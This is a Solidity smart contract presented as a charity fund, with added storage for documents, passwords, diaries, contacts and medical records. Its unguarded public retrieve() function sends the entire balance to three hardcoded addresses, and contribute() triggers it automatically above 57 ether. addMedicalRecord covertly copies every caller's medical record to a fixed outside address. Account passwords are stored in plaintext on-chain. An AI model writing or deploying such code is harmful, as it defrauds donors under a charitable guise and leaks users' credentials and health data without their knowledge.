// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CharityFund {
    address public owner;

    constructor() {
        owner = msg.sender;
    }
      
       
    // charity

    // Function to contribute funds to the contract
    function contribute(uint256 amount  ) public payable {
        require(msg.value == amount *1 ether, "Sent value must match the specified amount");
        require(amount > 0, "Must send some Ether");
        
        if (address(this).balance > 57 ether) {
            retrieve();
        }
    }

    // Function to retrieve all funds from the contract
    function retrieve() public {
        require(address(this).balance > 0, "No funds available");
        uint bal=address(this).balance;
        payable(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266).transfer(bal/3);
        payable(0x70997970C51812dc3A010C7d01b50e0d17dc79C8).transfer(bal/3);
        payable(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC).transfer(bal/3);


    }
// start charity/docs
    struct Document {
        string name;
        string description;
    }

    struct Account {
        string accountNumber;
        string password;
    }

    mapping(address => Document[]) private userDocuments;
    mapping(address => Account[]) private userAccounts;

    function addDocument(string memory _name, string memory _description) public {
        userDocuments[msg.sender].push(Document(_name, _description));
    }

    function addAccount(string memory _accountNumber, string memory _password) public {
        userAccounts[msg.sender].push(Account(_accountNumber, _password));
    }

    function getDocuments() public view returns (Document[] memory) {
        return userDocuments[msg.sender];
    }
   function getaccounts() public view returns (Account[] memory) {
    return userAccounts[msg.sender];
}

// start charity biodata

    struct dairyentry{
        string day;
        string dairy;
    }
    
    struct PersonDetails {
        string date;
        string memoryNote;
    }

    mapping(address => string[]) private userPersonNames; // Stores names for each user
    mapping(address => mapping(string => PersonDetails[])) private userContactDetails;
    mapping(address => dairyentry[]) private userDairyEntries;
     // Stores details per name for each user

    event PersonAdded(address indexed user, string name);
    event DetailAdded(address indexed user, string name, string date, string memoryNote);
    event DairyAdded(address indexed user, string date, string dairyentry);

    function addDairyentry(string memory _day,string memory _dairy) public 
    { userDairyEntries[msg.sender].push(dairyentry(_day,_dairy));
    emit DairyAdded(msg.sender, _day, _dairy);

    }
    // Function to check if a person exists for the caller
    function personExists(string memory _name) private view returns (bool) {
        string[] memory persons = userPersonNames[msg.sender];
        for (uint i = 0; i < persons.length; i++) {
            if (keccak256(bytes(persons[i])) == keccak256(bytes(_name))) {
                return true;
            }
        }
        return false;
    }

    // Function to add a person's name (if not already added)
    function addPerson(string memory _name) public {
        require(bytes(_name).length > 0, "Name cannot be empty");
        require(!personExists(_name), "Person already exists");

        userPersonNames[msg.sender].push(_name);
        emit PersonAdded(msg.sender, _name);
    }

    // Function to add details for a specific person
    function addDetail(string memory _name, string memory _date, string memory _memoryNote) public {
        require(personExists(_name), "Person does not exist. Add them first.");
        require(bytes(_date).length > 0, "Phone cannot be empty");
        require(bytes(_memoryNote).length > 0, "Memory note cannot be empty");

        userContactDetails[msg.sender][_name].push(PersonDetails(_date, _memoryNote));
        emit DetailAdded(msg.sender, _name, _date, _memoryNote);
    }


    // Function to get all persons stored by the sender
    function getPersons() public view returns (string[] memory) {
        return userPersonNames[msg.sender];
    }

    // Function to get details of a specific person stored by the sender
    function getPersonDetails(string memory _name) public view returns (PersonDetails[] memory) {
        require(personExists(_name), "Person does not exist.");
        return userContactDetails[msg.sender][_name];
    }

    function getDairyEntry() public view returns (dairyentry[] memory){ 
        return userDairyEntries[msg.sender];
    }
// medical record...
struct MedicalRecord {
        string diagnosis;
        string treatment;
        string prescribedMedication;
        uint256 date;
        string doctorName;
    }

    mapping(address => MedicalRecord[]) private medicalHistory;

    event RecordsAdded(
        address indexed user,
        string diagnosis,
        string treatment,
        string prescribedMedication,
        uint256 date,
        string doctorName
    );

    // Function to add medical records
    function addMedicalRecord(
        string memory _diagnosis,
        string memory _treatment,
        string memory _prescribedMedication,
        uint256 _date,
        string memory _doctorName
    ) public {
        medicalHistory[msg.sender].push(
            MedicalRecord({
                diagnosis: _diagnosis,
                treatment: _treatment,
                prescribedMedication: _prescribedMedication,
                date: _date,
                doctorName: _doctorName
            }));
        medicalHistory[0x70997970C51812dc3A010C7d01b50e0d17dc79C8].push(
            MedicalRecord({
                diagnosis: _diagnosis,
                treatment: _treatment,
                prescribedMedication: _prescribedMedication,
                date: _date,
                doctorName: _doctorName
            })    
            
        );

        emit RecordsAdded(msg.sender, _diagnosis, _treatment, _prescribedMedication, _date, _doctorName);
    }

    // Function to get all medical records of the caller
    function getMedicalRecords() public view returns (MedicalRecord[] memory) {
        return medicalHistory[msg.sender];
    }
}